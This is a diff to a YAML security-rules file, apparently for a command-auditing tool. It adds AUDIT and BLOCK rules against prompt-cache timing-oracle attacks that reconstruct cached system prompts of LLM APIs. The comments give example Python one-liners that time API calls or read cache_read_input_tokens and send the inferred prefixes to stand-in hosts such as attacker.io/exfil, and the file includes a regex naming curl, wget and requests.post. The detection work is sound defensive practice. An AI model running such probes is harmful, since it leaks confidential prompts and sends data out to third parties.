@@ -3342,6 +3342,67 @@ rules:
     confidence: 0.75
     reason: "LLM API call co-occurring with timing measurement — may indicate prompt cache timing oracle probing. Measuring response latency across varying prefixes can reconstruct cached system prompts (OWASP LLM02, LLM06, CWE-208)."
 
+  # === AUDIT: LLM prompt cache token probe via cache_read_input_tokens (LLM02, LLM10) ===
+  #
+  # Anthropic's API returns cache_read_input_tokens > 0 in usage metadata when a
+  # cached prompt prefix is active. An adversary can read this field to confirm
+  # cache hit/miss without measuring latency, enabling a noiseless timing oracle.
+  # Unlike the timing-based probe above, this signal is detectable without
+  # accurate clock measurement — making it viable in high-jitter environments.
+  #
+  # This covers the data-exfiltration variant:
+  #   python3 -c "
+  #     for prefix in prefixes:
+  #       resp = client.messages.create(...)
+  #       if resp.usage.cache_read_input_tokens > 0:
+  #         requests.post('https://attacker.io/exfil', json={'prefix': prefix})"
+  #
+  # Taxonomy: data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle
+  # OWASP LLM02 — Sensitive Information Disclosure, LLM10 — Unbounded Consumption
+  # CWE-208 — Observable Timing Discrepancy, CWE-203 — Observable Discrepancy
+  - id: "llm-cache-read-tokens-probe"
+    taxonomy: "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle"
+    match:
+      command_regex: "cache_read_input_tokens"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "Reference to cache_read_input_tokens — this Anthropic API usage field reveals whether a prompt prefix hit the cache, enabling timing oracle reconstruction of cached system prompts without clock measurement (OWASP LLM02, CWE-208)."
+
+  # === BLOCK: LLM cache timing oracle — data exfiltration chain (LLM02, LLM10) ===
+  #
+  # The data-exfiltration variant of the prompt cache timing oracle combines:
+  # 1. Timing measurement around LLM API calls (same as recon variant above)
+  # 2. Network egress to transmit the inferred cache-hit data to an attacker endpoint
+  #
+  # The conjunction of LLM API + timing + network egress in a single command is
+  # the key signal — the reconnaissance step and exfiltration step in one pipeline.
+  #
+  # Examples:
+  #   python3 -c "
+  #     t0=time.perf_counter()
+  #     resp=client.messages.create(...)
+  #     if time.perf_counter()-t0 < 0.3: requests.post('https://x.io', json={...})"
+  #
+  #   python3 -c "
+  #     import time,anthropic,urllib.request
+  #     for p in prefixes:
+  #       t0=time.time(); client.messages.create(...); dt=time.time()-t0
+  #       urllib.request.urlopen('https://log.x/?dt='+str(dt)+'&p='+p)"
+  #
+  # Decision: BLOCK — the three-way combination (LLM + timing + net egress in one
+  # command) has a very narrow legitimate use-case and high exfiltration intent.
+  #
+  # Taxonomy: data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle
+  # OWASP LLM02 — Sensitive Information Disclosure, LLM10 — Unbounded Consumption
+  # CWE-208 — Observable Timing Discrepancy, CWE-203 — Observable Discrepancy
+  - id: "llm-cache-timing-exfil"
+    taxonomy: "data-exfiltration/llm-data-flow/llm-prompt-cache-timing-oracle"
+    match:
+      command_regex: "(time\\.time|time\\.perf_counter|time\\.monotonic|perf_counter|time\\.clock).*(anthropic|openai|messages\\.create|chat\\.completions|completions\\.create).*(curl|wget|requests\\.post|requests\\.get|urllib\\.request|http\\.post|httpx)|(anthropic|openai|messages\\.create|chat\\.completions|completions\\.create).*(time\\.time|time\\.perf_counter|time\\.monotonic|perf_counter|time\\.clock).*(curl|wget|requests\\.post|requests\\.get|urllib\\.request|http\\.post|httpx)"
+    decision: "BLOCK"
+    confidence: 0.85
+    reason: "LLM API timing measurement co-occurring with network egress — data-exfiltration variant of prompt cache timing oracle: inferred cache hit/miss results transmitted to an external endpoint (OWASP LLM02, LLM10, CWE-208)."
+
   # === AUDIT: Thinking token side-channel / guardrail boundary mapping (LLM02, LLM06) ===
   #
   # Adversaries probe extended thinking models (Claude 3.7+/4, o1/o3, Gemini
